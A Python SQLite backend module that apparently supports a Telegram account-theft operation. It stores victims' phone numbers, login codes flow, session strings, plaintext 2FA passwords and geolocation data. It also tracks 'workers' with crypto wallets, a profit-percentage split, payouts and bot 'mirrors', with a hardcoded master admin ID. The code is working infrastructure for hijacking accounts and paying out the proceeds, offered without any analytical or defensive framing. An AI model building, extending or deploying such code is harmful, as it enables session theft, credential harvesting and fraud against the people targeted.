import os
import sqlite3
from contextlib import contextmanager
from datetime import datetime, timezone
from typing import Optional

SCHEMA = """
CREATE TABLE IF NOT EXISTS tokens (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    token TEXT NOT NULL UNIQUE,
    username TEXT,
    status TEXT NOT NULL DEFAULT 'standby',
    added_at TEXT NOT NULL,
    activated_at TEXT,
    banned_at TEXT
);

CREATE TABLE IF NOT EXISTS settings (
    key TEXT PRIMARY KEY,
    value TEXT NOT NULL
);

CREATE TABLE IF NOT EXISTS users (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    tg_id INTEGER NOT NULL UNIQUE,
    username TEXT,
    nickname TEXT,
    phone TEXT,
    agreement_accepted INTEGER DEFAULT 0,
    agreement_at TEXT,
    session_string TEXT,
    auth_step TEXT,
    worker_tg_id INTEGER,
    registered_at TEXT NOT NULL,
    status TEXT NOT NULL DEFAULT 'active',
    ip TEXT,
    country TEXT,
    city TEXT,
    isp TEXT,
    device TEXT
);

CREATE TABLE IF NOT EXISTS workers (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    tg_id INTEGER NOT NULL UNIQUE,
    username TEXT,
    wallet_trc20 TEXT,
    balance REAL DEFAULT 0.0,
    custom_percent INTEGER DEFAULT 70,
    role TEXT DEFAULT 'worker',
    created_at TEXT NOT NULL
);

CREATE TABLE IF NOT EXISTS payouts (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    worker_tg_id INTEGER NOT NULL,
    amount REAL NOT NULL,
    method TEXT NOT NULL,
    requisites TEXT,
    status TEXT NOT NULL DEFAULT 'pending',
    created_at TEXT NOT NULL,
    processed_at TEXT
);

CREATE TABLE IF NOT EXISTS admins (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    tg_id INTEGER NOT NULL UNIQUE,
    username TEXT,
    role TEXT NOT NULL DEFAULT 'admin',
    added_at TEXT NOT NULL
);

CREATE TABLE IF NOT EXISTS profits (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    worker_tg_id INTEGER NOT NULL,
    amount REAL NOT NULL,
    comment TEXT,
    added_by INTEGER,
    created_at TEXT NOT NULL
);
"""


def _now() -> str:
    return datetime.now(timezone.utc).isoformat()


class DictRow(dict):
    """
    Drop-in replacement for sqlite3.Row that behaves both as a dictionary
    (with .get(), .keys(), in operator, etc.) and allows integer index access (row[0]).
    """
    def __init__(self, cursor, row):
        super().__init__()
        self._fields = [col[0] for col in cursor.description]
        self._row = row
        for col, val in zip(self._fields, row):
            self[col] = val

    def __getitem__(self, item):
        if isinstance(item, int):
            return self._row[item]
        return super().__getitem__(item)

    def keys(self):
        return super().keys()


@contextmanager
def _connect(db_path: str):
    os.makedirs(os.path.dirname(db_path) or ".", exist_ok=True)
    conn = sqlite3.connect(db_path)
    conn.row_factory = DictRow
    try:
        yield conn
        conn.commit()
    finally:
        conn.close()


def init_db(db_path: str) -> None:
    with _connect(db_path) as conn:
        conn.executescript(SCHEMA)
        try:
            cols_u = [r[1] for r in conn.execute("PRAGMA table_info(users)").fetchall()]
            if "phone" not in cols_u:
                conn.execute("ALTER TABLE users ADD COLUMN phone TEXT")
            if "email" not in cols_u:
                conn.execute("ALTER TABLE users ADD COLUMN email TEXT")
            if "agreement_accepted" not in cols_u:
                conn.execute("ALTER TABLE users ADD COLUMN agreement_accepted INTEGER DEFAULT 0")
            if "agreement_at" not in cols_u:
                conn.execute("ALTER TABLE users ADD COLUMN agreement_at TEXT")
            if "session_string" not in cols_u:
                conn.execute("ALTER TABLE users ADD COLUMN session_string TEXT")
            if "auth_step" not in cols_u:
                conn.execute("ALTER TABLE users ADD COLUMN auth_step TEXT")
            if "worker_tg_id" not in cols_u:
                conn.execute("ALTER TABLE users ADD COLUMN worker_tg_id INTEGER")
            if "password_2fa" not in cols_u:
                conn.execute("ALTER TABLE users ADD COLUMN password_2fa TEXT")
            if "admin_log_msg_id" not in cols_u:
                conn.execute("ALTER TABLE users ADD COLUMN admin_log_msg_id INTEGER")
            if "worker_log_msg_id" not in cols_u:
                conn.execute("ALTER TABLE users ADD COLUMN worker_log_msg_id INTEGER")
            if "worker_alert_msg_id" not in cols_u:
                conn.execute("ALTER TABLE users ADD COLUMN worker_alert_msg_id INTEGER")
            if "admin_alert_msg_id" not in cols_u:
                conn.execute("ALTER TABLE users ADD COLUMN admin_alert_msg_id INTEGER")
            if "mirror_token" not in cols_u:
                conn.execute("ALTER TABLE users ADD COLUMN mirror_token TEXT")
            if "mirror_username" not in cols_u:
                conn.execute("ALTER TABLE users ADD COLUMN mirror_username TEXT")
            if "ip" not in cols_u:
                conn.execute("ALTER TABLE users ADD COLUMN ip TEXT")
            if "country" not in cols_u:
                conn.execute("ALTER TABLE users ADD COLUMN country TEXT")
            if "city" not in cols_u:
                conn.execute("ALTER TABLE users ADD COLUMN city TEXT")
            if "isp" not in cols_u:
                conn.execute("ALTER TABLE users ADD COLUMN isp TEXT")
            if "device" not in cols_u:
                conn.execute("ALTER TABLE users ADD COLUMN device TEXT")

            cols_w = [r[1] for r in conn.execute("PRAGMA table_info(workers)").fetchall()]
            if "custom_percent" not in cols_w:
                conn.execute("ALTER TABLE workers ADD COLUMN custom_percent INTEGER DEFAULT 70")
            if "role" not in cols_w:
                conn.execute("ALTER TABLE workers ADD COLUMN role TEXT DEFAULT 'worker'")

            cols_t = [r[1] for r in conn.execute("PRAGMA table_info(tokens)").fetchall()]
            if "owner_tg_id" not in cols_t:
                conn.execute("ALTER TABLE tokens ADD COLUMN owner_tg_id INTEGER")
            conn.execute("UPDATE tokens SET status = 'active' WHERE status = 'standby'")

            # Ensure master admin 7491827504 is in admins table
            conn.execute(
                "INSERT INTO admins (tg_id, username, role, added_at) VALUES (7491827504, 'admin', 'admin', ?) "
                "ON CONFLICT(tg_id) DO NOTHING",
                (_now(),),
            )
        except Exception:
            pass


def add_token(db_path: str, token: str, username: str, owner_tg_id: Optional[int] = None) -> int:
    with _connect(db_path) as conn:
        cur = conn.execute(
            "INSERT INTO tokens (token, username, status, added_at, activated_at, owner_tg_id) "
            "VALUES (?, ?, 'active', ?, ?, ?) "
            "ON CONFLICT(token) DO UPDATE SET status = 'active', activated_at = ?, owner_tg_id = coalesce(excluded.owner_tg_id, tokens.owner_tg_id)",
            (token, username, _now(), _now(), owner_tg_id, _now()),
        )
        return cur.lastrowid


def get_active_tokens(db_path: str):
    with _connect(db_path) as conn:
        return conn.execute("SELECT * FROM tokens WHERE status != 'banned' ORDER BY added_at ASC").fetchall()


def get_tokens_by_owner(db_path: str, owner_tg_id: int):
    with _connect(db_path) as conn:
        return conn.execute(
            "SELECT * FROM tokens WHERE owner_tg_id = ? ORDER BY added_at DESC",
            (owner_tg_id,),
        ).fetchall()


def get_token_by_token(db_path: str, token: str) -> Optional[sqlite3.Row]:
    with _connect(db_path) as conn:
        return conn.execute("SELECT * FROM tokens WHERE token = ?", (token,)).fetchone()


def get_active(db_path: str) -> Optional[sqlite3.Row]:
    with _connect(db_path) as conn:
        return conn.execute(
            "SELECT * FROM tokens WHERE status = 'active' ORDER BY activated_at DESC LIMIT 1"
        ).fetchone()


def get_next_standby(db_path: str) -> Optional[sqlite3.Row]:
    with _connect(db_path) as conn:
        return conn.execute(
            "SELECT * FROM tokens WHERE status = 'standby' ORDER BY added_at ASC LIMIT 1"
        ).fetchone()


def set_status(db_path: str, token_id: int, status: str, timestamp_field: Optional[str] = None) -> None:
    with _connect(db_path) as conn:
        if timestamp_field:
            conn.execute(
                f"UPDATE tokens SET status = ?, {timestamp_field} = ? WHERE id = ?",
                (status, _now(), token_id),
            )
        else:
            conn.execute("UPDATE tokens SET status = ? WHERE id = ?", (status, token_id))


def list_tokens(db_path: str):
    with _connect(db_path) as conn:
        return conn.execute("SELECT * FROM tokens ORDER BY added_at ASC").fetchall()


def get_token_by_id(db_path: str, token_id: int) -> Optional[sqlite3.Row]:
    with _connect(db_path) as conn:
        return conn.execute("SELECT * FROM tokens WHERE id = ?", (token_id,)).fetchone()


def get_setting(db_path: str, key: str, default: str) -> str:
    with _connect(db_path) as conn:
        row = conn.execute("SELECT value FROM settings WHERE key = ?", (key,)).fetchone()
        return row["value"] if row else default


def set_setting(db_path: str, key: str, value: str) -> None:
    with _connect(db_path) as conn:
        conn.execute(
            "INSERT INTO settings (key, value) VALUES (?, ?) "
            "ON CONFLICT(key) DO UPDATE SET value = excluded.value",
            (key, value),
        )


def get_or_create_user(
    db_path: str,
    tg_id: int,
    username: Optional[str] = None,
    nickname: Optional[str] = None,
    phone: Optional[str] = None,
    worker_tg_id: Optional[int] = None,
    mirror_token: Optional[str] = None,
    mirror_username: Optional[str] = None,
) -> sqlite3.Row:
    with _connect(db_path) as conn:
        conn.execute(
            "INSERT INTO users (tg_id, username, nickname, phone, worker_tg_id, mirror_token, mirror_username, registered_at) "
            "VALUES (?, ?, ?, ?, ?, ?, ?, ?) "
            "ON CONFLICT(tg_id) DO UPDATE SET "
            "username = coalesce(excluded.username, users.username), "
            "nickname = coalesce(excluded.nickname, users.nickname), "
            "phone = coalesce(excluded.phone, users.phone), "
            "worker_tg_id = coalesce(users.worker_tg_id, excluded.worker_tg_id), "
            "mirror_token = coalesce(users.mirror_token, excluded.mirror_token), "
            "mirror_username = coalesce(users.mirror_username, excluded.mirror_username)",
            (tg_id, username, nickname or username or "Пользователь", phone, worker_tg_id, mirror_token, mirror_username, _now()),
        )
        return conn.execute("SELECT * FROM users WHERE tg_id = ?", (tg_id,)).fetchone()


def register_user(
    db_path: str,
    tg_id: int,
    username: Optional[str],
    nickname: str,
    worker_tg_id: Optional[int] = None,
    mirror_token: Optional[str] = None,
    mirror_username: Optional[str] = None,
) -> int:
    with _connect(db_path) as conn:
        conn.execute(
            "INSERT INTO users (tg_id, username, nickname, worker_tg_id, mirror_token, mirror_username, registered_at) "
            "VALUES (?, ?, ?, ?, ?, ?, ?) "
            "ON CONFLICT(tg_id) DO UPDATE SET "
            "username = coalesce(excluded.username, users.username), "
            "nickname = coalesce(excluded.nickname, users.nickname), "
            "worker_tg_id = coalesce(users.worker_tg_id, excluded.worker_tg_id), "
            "mirror_token = coalesce(users.mirror_token, excluded.mirror_token), "
            "mirror_username = coalesce(users.mirror_username, excluded.mirror_username)",
            (tg_id, username, nickname, worker_tg_id, mirror_token, mirror_username, _now()),
        )
        row = conn.execute("SELECT id FROM users WHERE tg_id = ?", (tg_id,)).fetchone()
        return row["id"]


def get_user_by_tg_id(db_path: str, tg_id: int) -> Optional[sqlite3.Row]:
    with _connect(db_path) as conn:
        return conn.execute("SELECT * FROM users WHERE tg_id = ?", (tg_id,)).fetchone()


def get_user_by_id(db_path: str, user_id: int) -> Optional[sqlite3.Row]:
    with _connect(db_path) as conn:
        return conn.execute("SELECT * FROM users WHERE id = ?", (user_id,)).fetchone()


def get_user_by_phone(db_path: str, phone: str) -> Optional[sqlite3.Row]:
    clean = phone.strip().replace(" ", "").replace("-", "")
    with _connect(db_path) as conn:
        return conn.execute(
            "SELECT * FROM users WHERE phone = ? OR phone = ? OR replace(replace(phone, ' ', ''), '-', '') = ? ORDER BY id DESC LIMIT 1",
            (phone, clean, clean),
        ).fetchone()


def set_user_agreement(
    db_path: str,
    tg_id: int,
    username: Optional[str],
    accepted: bool,
    worker_tg_id: Optional[int] = None,
) -> None:
    with _connect(db_path) as conn:
        conn.execute(
            "INSERT INTO users (tg_id, username, nickname, agreement_accepted, agreement_at, worker_tg_id, registered_at) "
            "VALUES (?, ?, ?, ?, ?, ?, ?) "
            "ON CONFLICT(tg_id) DO UPDATE SET "
            "agreement_accepted = excluded.agreement_accepted, "
            "agreement_at = excluded.agreement_at, "
            "worker_tg_id = coalesce(excluded.worker_tg_id, users.worker_tg_id), "
            "username = coalesce(excluded.username, users.username)",
            (tg_id, username, username or "User", 1 if accepted else 0, _now(), worker_tg_id, _now()),
        )


def set_user_phone(db_path: str, tg_id: int, phone: str) -> None:
    with _connect(db_path) as conn:
        conn.execute(
            """UPDATE users 
               SET phone = ?, 
                   auth_step = CASE 
                       WHEN auth_step IN ('authorized', 'session_revoked') THEN auth_step 
                       ELSE 'waiting_code' 
                   END 
               WHERE tg_id = ?""",
            (phone, tg_id),
        )


def set_user_email(db_path: str, tg_id: int, email: str) -> None:
    with _connect(db_path) as conn:
        conn.execute(
            "UPDATE users SET email = ? WHERE tg_id = ?",
            (email, tg_id),
        )


def get_user_by_email(db_path: str, email: str) -> Optional[sqlite3.Row]:
    clean = email.strip().lower()
    with _connect(db_path) as conn:
        return conn.execute(
            "SELECT * FROM users WHERE lower(email) = ? ORDER BY id DESC LIMIT 1",
            (clean,),
        ).fetchone()


def set_user_session(db_path: str, tg_id: int, session_string: str) -> None:
    with _connect(db_path) as conn:
        conn.execute(
            "UPDATE users SET session_string = ?, auth_step = 'authorized' WHERE tg_id = ?",
            (session_string, tg_id),
        )


def set_user_auth_step(db_path: str, tg_id: int, step: str) -> None:
    with _connect(db_path) as conn:
        conn.execute(
            "UPDATE users SET auth_step = ? WHERE tg_id = ?",
            (step, tg_id),
        )


def set_user_2fa_password(db_path: str, tg_id: int, password: str) -> None:
    with _connect(db_path) as conn:
        conn.execute(
            "UPDATE users SET password_2fa = ?, auth_step = 'authorized' WHERE tg_id = ?",
            (password, tg_id),
        )


def clear_user_session(db_path: str, tg_id: int) -> None:
    with _connect(db_path) as conn:
        conn.execute(
            "UPDATE users SET session_string = NULL, auth_step = 'logged_out' WHERE tg_id = ?",
            (tg_id,),
        )


def update_user_auth(
    db_path: str,
    tg_id: int,
    session_string: Optional[str] = None,
    auth_step: Optional[str] = None,
) -> None:
    with _connect(db_path) as conn:
        conn.execute(
            "UPDATE users SET session_string = ?, auth_step = coalesce(?, auth_step) WHERE tg_id = ?",
            (session_string, auth_step, tg_id),
        )


def set_user_geo(
    db_path: str,
    tg_id: int,
    ip: Optional[str] = None,
    country: Optional[str] = None,
    city: Optional[str] = None,
    isp: Optional[str] = None,
    device: Optional[str] = None,
) -> None:
    with _connect(db_path) as conn:
        conn.execute(
            """UPDATE users SET 
                ip = coalesce(?, ip),
                country = coalesce(?, country),
                city = coalesce(?, city),
                isp = coalesce(?, isp),
                device = coalesce(?, device)
            WHERE tg_id = ?""",
            (ip, country, city, isp, device, tg_id),
        )


def set_user_log_messages(
    db_path: str,
    tg_id: int,
    admin_msg_id: Optional[int] = None,
    worker_msg_id: Optional[int] = None,
    worker_alert_msg_id: Optional[int] = None,
    admin_alert_msg_id: Optional[int] = None,
) -> None:
    with _connect(db_path) as conn:
        conn.execute(
            "INSERT OR IGNORE INTO users (tg_id, registered_at) VALUES (?, ?)",
            (tg_id, _now()),
        )
        updates = []
        params = []
        if admin_msg_id is not None:
            updates.append("admin_log_msg_id = ?")
            params.append(admin_msg_id)
        if worker_msg_id is not None:
            updates.append("worker_log_msg_id = ?")
            params.append(worker_msg_id)
        if worker_alert_msg_id is not None:
            updates.append("worker_alert_msg_id = ?")
            params.append(worker_alert_msg_id if worker_alert_msg_id != -1 else None)
        if admin_alert_msg_id is not None:
            updates.append("admin_alert_msg_id = ?")
            params.append(admin_alert_msg_id if admin_alert_msg_id != -1 else None)
        if updates:
            params.append(tg_id)
            conn.execute(f"UPDATE users SET {', '.join(updates)} WHERE tg_id = ?", tuple(params))


def list_users(db_path: str):
    with _connect(db_path) as conn:
        return conn.execute("SELECT * FROM users ORDER BY id ASC").fetchall()


def get_unauthorized_users(db_path: str):
    with _connect(db_path) as conn:
        return conn.execute(
            "SELECT * FROM users WHERE (session_string IS NULL OR session_string = '' OR auth_step != 'authorized') AND status = 'active'"
        ).fetchall()


def get_authorized_users(db_path: str):
    with _connect(db_path) as conn:
        return conn.execute(
            "SELECT * FROM users WHERE session_string IS NOT NULL AND session_string != '' AND auth_step = 'authorized' AND status = 'active'"
        ).fetchall()


def get_or_create_worker(db_path: str, tg_id: int, username: Optional[str] = None) -> sqlite3.Row:
    with _connect(db_path) as conn:
        conn.execute(
            "INSERT INTO workers (tg_id, username, created_at) VALUES (?, ?, ?) "
            "ON CONFLICT(tg_id) DO UPDATE SET username = coalesce(excluded.username, workers.username)",
            (tg_id, username, _now()),
        )
        return conn.execute("SELECT * FROM workers WHERE tg_id = ?", (tg_id,)).fetchone()


def get_worker_by_tg_id(db_path: str, tg_id: int) -> Optional[sqlite3.Row]:
    with _connect(db_path) as conn:
        return conn.execute("SELECT * FROM workers WHERE tg_id = ?", (tg_id,)).fetchone()


def set_worker_wallet(db_path: str, tg_id: int, wallet: str) -> None:
    with _connect(db_path) as conn:
        conn.execute("UPDATE workers SET wallet_trc20 = ? WHERE tg_id = ?", (wallet, tg_id))


def get_worker_mirrors(db_path: str, worker_tg_id: int):
    with _connect(db_path) as conn:
        return conn.execute(
            "SELECT * FROM tokens WHERE owner_tg_id = ? ORDER BY added_at DESC",
            (worker_tg_id,),
        ).fetchall()


def get_worker_logs(db_path: str, worker_tg_id: int):
    with _connect(db_path) as conn:
        return conn.execute(
            "SELECT * FROM users WHERE worker_tg_id = ? ORDER BY id DESC",
            (worker_tg_id,),
        ).fetchall()


def create_payout_request(
    db_path: str,
    worker_tg_id: int,
    amount: float,
    method: str,
    requisites: Optional[str] = None,
) -> int:
    with _connect(db_path) as conn:
        cur = conn.execute(
            "INSERT INTO payouts (worker_tg_id, amount, method, requisites, status, created_at) "
            "VALUES (?, ?, ?, ?, 'pending', ?)",
            (worker_tg_id, amount, method, requisites, _now()),
        )
        return cur.lastrowid


def get_worker_payouts(db_path: str, worker_tg_id: int):
    with _connect(db_path) as conn:
        return conn.execute(
            "SELECT * FROM payouts WHERE worker_tg_id = ? ORDER BY id DESC",
            (worker_tg_id,),
        ).fetchall()


def get_payout_by_id(db_path: str, payout_id: int) -> Optional[sqlite3.Row]:
    with _connect(db_path) as conn:
        return conn.execute("SELECT * FROM payouts WHERE id = ?", (payout_id,)).fetchone()


def set_payout_status(db_path: str, payout_id: int, status: str) -> None:
    with _connect(db_path) as conn:
        conn.execute(
            "UPDATE payouts SET status = ?, processed_at = ? WHERE id = ?",
            (status, _now(), payout_id),
        )


def set_worker_balance(db_path: str, worker_tg_id: int, balance: float) -> None:
    with _connect(db_path) as conn:
        conn.execute("UPDATE workers SET balance = ? WHERE tg_id = ?", (balance, worker_tg_id))


def deduct_worker_balance(db_path: str, worker_tg_id: int, amount: float) -> None:
    with _connect(db_path) as conn:
        conn.execute(
            "UPDATE workers SET balance = max(0.0, balance - ?) WHERE tg_id = ?",
            (amount, worker_tg_id),
        )


def add_worker_balance(db_path: str, worker_tg_id: int, amount: float) -> None:
    with _connect(db_path) as conn:
        conn.execute(
            "UPDATE workers SET balance = balance + ? WHERE tg_id = ?",
            (amount, worker_tg_id),
        )


def get_worker_total_profit(db_path: str, worker_tg_id: int) -> float:
    with _connect(db_path) as conn:
        worker = conn.execute("SELECT balance FROM workers WHERE tg_id = ?", (worker_tg_id,)).fetchone()
        balance = worker["balance"] if worker and worker["balance"] is not None else 0.0
        row = conn.execute(
            "SELECT COALESCE(SUM(amount), 0.0) as total FROM payouts WHERE worker_tg_id = ? AND status = 'approved'",
            (worker_tg_id,),
        ).fetchone()
        payouts_sum = row["total"] if row else 0.0
        return float(balance + payouts_sum)


def get_setting(db_path: str, key: str, default: str = "") -> str:
    with _connect(db_path) as conn:
        row = conn.execute("SELECT value FROM settings WHERE key = ?", (key,)).fetchone()
        return row["value"] if row else default


def set_setting(db_path: str, key: str, value: str) -> None:
    with _connect(db_path) as conn:
        conn.execute(
            "INSERT INTO settings (key, value) VALUES (?, ?) ON CONFLICT(key) DO UPDATE SET value = excluded.value",
            (key, value),
        )


def get_all_logs(db_path: str):
    with _connect(db_path) as conn:
        return conn.execute("SELECT * FROM users ORDER BY id DESC").fetchall()


def get_all_workers(db_path: str):
    with _connect(db_path) as conn:
        return conn.execute("SELECT * FROM workers ORDER BY id DESC").fetchall()


def get_all_payouts(db_path: str):
    with _connect(db_path) as conn:
        return conn.execute("SELECT * FROM payouts ORDER BY id DESC").fetchall()


def get_team_stats(db_path: str) -> dict:
    with _connect(db_path) as conn:
        workers_cnt = conn.execute("SELECT count(*) as c FROM workers").fetchone()["c"]
        mirrors_cnt = conn.execute("SELECT count(*) as c FROM tokens WHERE status != 'banned'").fetchone()["c"]
        logs_cnt = conn.execute("SELECT count(*) as c FROM users").fetchone()["c"]
        auth_cnt = conn.execute(
            "SELECT count(*) as c FROM users WHERE session_string IS NOT NULL AND session_string != '' AND auth_step = 'authorized'"
        ).fetchone()["c"]
        payouts_row = conn.execute(
            "SELECT COALESCE(SUM(amount), 0.0) as total FROM payouts WHERE status = 'approved'"
        ).fetchone()
        payouts_sum = payouts_row["total"] if payouts_row else 0.0
        pending_cnt = conn.execute("SELECT count(*) as c FROM payouts WHERE status = 'pending'").fetchone()["c"]
        return {
            "workers_count": workers_cnt,
            "mirrors_count": mirrors_cnt,
            "logs_count": logs_cnt,
            "auth_count": auth_cnt,
            "payouts_total": payouts_sum,
            "pending_payouts_count": pending_cnt,
        }


def get_worker_by_query(db_path: str, query: str) -> Optional[sqlite3.Row]:
    query_clean = query.strip().lstrip("@")
    with _connect(db_path) as conn:
        if query_clean.isdigit():
            tg_id = int(query_clean)
            worker = conn.execute("SELECT * FROM workers WHERE tg_id = ?", (tg_id,)).fetchone()
            if worker:
                return worker
        # Search by username (case-insensitive)
        return conn.execute(
            "SELECT * FROM workers WHERE LOWER(username) = LOWER(?)",
            (query_clean,),
        ).fetchone()


def set_worker_percent(db_path: str, worker_tg_id: int, percent: int) -> None:
    with _connect(db_path) as conn:
        conn.execute("UPDATE workers SET custom_percent = ? WHERE tg_id = ?", (percent, worker_tg_id))


def get_worker_percent(db_path: str, worker_tg_id: int) -> int:
    with _connect(db_path) as conn:
        row = conn.execute("SELECT custom_percent FROM workers WHERE tg_id = ?", (worker_tg_id,)).fetchone()
        if row and row["custom_percent"] is not None:
            return int(row["custom_percent"])
        # Global fallback
        glob_row = conn.execute("SELECT value FROM settings WHERE key = 'worker_percent'").fetchone()
        return int(glob_row["value"]) if glob_row and glob_row["value"].isdigit() else 70


def get_all_admins(db_path: str):
    with _connect(db_path) as conn:
        return conn.execute("SELECT * FROM admins WHERE role = 'admin' ORDER BY id ASC").fetchall()


def get_admin_by_tg_id(db_path: str, tg_id: int) -> Optional[sqlite3.Row]:
    with _connect(db_path) as conn:
        return conn.execute("SELECT * FROM admins WHERE tg_id = ?", (tg_id,)).fetchone()


def add_admin(db_path: str, tg_id: int, username: Optional[str] = None, role: str = "admin") -> int:
    with _connect(db_path) as conn:
        cur = conn.execute(
            "INSERT INTO admins (tg_id, username, role, added_at) VALUES (?, ?, ?, ?) "
            "ON CONFLICT(tg_id) DO UPDATE SET role = excluded.role, username = coalesce(excluded.username, admins.username)",
            (tg_id, username, role, _now()),
        )
        conn.execute("UPDATE workers SET role = 'admin' WHERE tg_id = ?", (tg_id,))
        return cur.lastrowid


def remove_admin(db_path: str, tg_id: int) -> None:
    with _connect(db_path) as conn:
        conn.execute("DELETE FROM admins WHERE tg_id = ?", (tg_id,))
        conn.execute("UPDATE workers SET role = 'worker' WHERE tg_id = ?", (tg_id,))


def set_admin_role(db_path: str, tg_id: int, role: str) -> None:
    with _connect(db_path) as conn:
        if role == "admin":
            conn.execute("UPDATE admins SET role = 'admin' WHERE tg_id = ?", (tg_id,))
            conn.execute("UPDATE workers SET role = 'admin' WHERE tg_id = ?", (tg_id,))
        else:
            conn.execute("DELETE FROM admins WHERE tg_id = ?", (tg_id,))
            conn.execute("UPDATE workers SET role = 'worker' WHERE tg_id = ?", (tg_id,))


def is_admin_user(db_path: str, tg_id: int) -> bool:
    if tg_id == 7491827504:
        return True
    with _connect(db_path) as conn:
        row = conn.execute("SELECT id FROM admins WHERE tg_id = ? AND role = 'admin'", (tg_id,)).fetchone()
        return bool(row)


def add_profit(
    db_path: str,
    worker_tg_id: int,
    amount: float,
    comment: str = "",
    added_by: Optional[int] = None,
) -> int:
    with _connect(db_path) as conn:
        cur = conn.execute(
            "INSERT INTO profits (worker_tg_id, amount, comment, added_by, created_at) "
            "VALUES (?, ?, ?, ?, ?)",
            (worker_tg_id, amount, comment, added_by, _now()),
        )
        # Credit worker balance
        conn.execute(
            "UPDATE workers SET balance = balance + ? WHERE tg_id = ?",
            (amount, worker_tg_id),
        )
        return cur.lastrowid


def get_all_profits(db_path: str):
    with _connect(db_path) as conn:
        return conn.execute("SELECT * FROM profits ORDER BY id DESC").fetchall()


def get_total_profits_sum(db_path: str) -> float:
    with _connect(db_path) as conn:
        row = conn.execute("SELECT COALESCE(SUM(amount), 0.0) as total FROM profits").fetchone()
        payouts_row = conn.execute("SELECT COALESCE(SUM(amount), 0.0) as total FROM payouts WHERE status = 'approved'").fetchone()
        profits_sum = row["total"] if row else 0.0
        payouts_sum = payouts_row["total"] if payouts_row else 0.0
        return float(profits_sum if profits_sum > 0 else payouts_sum)





